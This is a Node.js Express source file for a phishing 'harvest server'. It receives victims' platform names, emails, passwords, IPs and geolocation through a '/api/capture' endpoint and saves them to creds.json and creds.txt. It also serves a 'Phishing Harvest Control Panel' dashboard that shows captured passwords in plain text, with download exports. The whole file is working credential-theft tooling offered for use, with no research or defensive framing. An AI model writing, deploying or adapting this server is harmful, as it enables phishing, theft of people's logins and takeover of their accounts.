const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

let creds = [];
let credCount = 0;

// Load existing creds
if (fs.existsSync('creds.json')) {
    try {
        creds = JSON.parse(fs.readFileSync('creds.json', 'utf8')).creds || [];
        credCount = creds.length;
    } catch (e) {
        console.log('Resetting corrupt creds.json');
    }
}

// 🎣 CAPTURE ENDPOINT
app.post('/api/capture', (req, res) => {
    const { platform = 'Unknown', email, password, ip = 'local', ua, geo } = req.body;
    
    const entry = {
        id: ++credCount,
        platform, email, password,
        ip, ua: ua ? ua.slice(0, 100) : '', geo: geo || '',
        timestamp: new Date().toISOString()
    };
    
    creds.unshift(entry);  // Newest first
    if (creds.length > 1000) creds = creds.slice(0, 1000);  // Cap memory
    
    // Save to files
    fs.writeFileSync('creds.json', JSON.stringify({ creds }, null, 2));
    fs.appendFileSync('creds.txt', `${entry.timestamp}|${platform}|${email}|${password}|${ip}|${geo}\n`);
    
    console.log(`🎣 [${platform}] ${email} (${ip})`);
    res.json({ success: true });
});

// 📊 DASHBOARD
app.get('/dashboard', (req, res) => {
    const recent = creds.slice(0, 50);
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>🎯 Harvest Dashboard</title>
    <meta name="viewport" content="width=device-width">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",monospace;padding:2rem;max-width:1400px;margin:auto;line-height:1.5}
        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem}
        h1{font-size:2rem;background:linear-gradient(135deg,#58a6ff,#1f6feb); -webkit-background-clip:text; -webkit-text-fill-color:transparent}
        .stats{background:#21262d;padding:1rem;border-radius:8px;margin-bottom:1.5rem}
        table{width:100%;border-collapse:collapse;font-size:14px}
        th{padding:12px 16px;background:#30363d;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;border-bottom:2px solid #484f58}
        td{padding:12px 16px;border-bottom:1px solid #30363d}
        tr:hover{background:#161b22}
        .email{font-weight:600;color:#58a6ff}
        .ip a{color:#8b949e;text-decoration:none}
        .ip a:hover{color:#58a6ff}
        .download{float:right;margin-left:1rem;padding:8px 16px;background:#238636;color:white;border-radius:6px;text-decoration:none;font-size:14px}
        .empty{padding:4rem;text-align:center;color:#8b949e}
        @media(max-width:768px){table{font-size:12px} th,td{padding:8px 4px}}
    </style>
</head>
<body>
    <div class="header">
        <h1>Phishing Harvest Control Panel</h1>
        <div>
            <a href="creds.txt" class="download" download>📥 TXT Export</a>
            <a href="creds.json" class="download" download>📄 JSON Export</a>
        </div>
    </div>
    
    <div class="stats">
        <strong>Total Captures: ${creds.length}</strong> | 
        Latest: ${creds[0] ? new Date(creds[0].timestamp).toLocaleString() : 'None'}
    </div>
    
    ${creds.length ? `
    <table>
        <thead><tr>
            <th>ID</th><th>Time</th><th>Platform</th><th>Email</th><th>Password</th><th>IP</th><th>Geo</th>
        </tr></thead>
        <tbody>
        ${recent.map(c => `
        <tr>
            <td>${c.id}</td>
            <td>${new Date(c.timestamp).toLocaleString()}</td>
            <td>${c.platform}</td>
            <td><span class="email">${c.email}</span></td>
            <td style="font-family:monospace">${c.password}</td>
            <td><a class="ip" href="https://ipinfo.io/${c.ip}" target="_blank">${c.ip}</a></td>
            <td>${c.geo}</td>
        </tr>`).join('')}
        </tbody>
    </table>` : '<div class="empty">🎣 Waiting for captures...</div>'}
</body>
</html>`);
});

app.get('/creds.txt', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.download('creds.txt');
});

app.get('/creds.json', (req, res) => {
    res.json({ creds });
});

console.log('🕸️  === HARVEST SERVER LIVE ===');
console.log('📊 Dashboard: http://localhost:3000/dashboard');
console.log('🔌 API: POST http://localhost:3000/api/capture');
console.log('📱 Local Network: http://' + require('os').networkInterfaces().wlan0?.[0]?.address + ':3000/dashboard');
app.listen(3000);
